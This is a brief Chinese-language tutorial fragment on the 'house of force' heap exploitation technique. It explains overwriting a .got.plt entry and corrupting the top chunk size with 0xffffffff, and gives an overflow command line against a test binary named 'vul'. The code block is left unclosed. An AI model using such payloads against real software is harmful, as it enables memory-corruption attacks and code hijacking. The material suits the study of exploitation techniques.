## house of force

这里使用覆盖 `.got.plt` 表地址作为测试例子

请注意这里 `free@plt` 的计算, 以及 `\xff\xff\xff\xff` 修改 top chunk 的 size 大小.

```
./vul $(python -c 'print "A"*260 + "\xff\xff\xff\xff"') free@plt AAAA
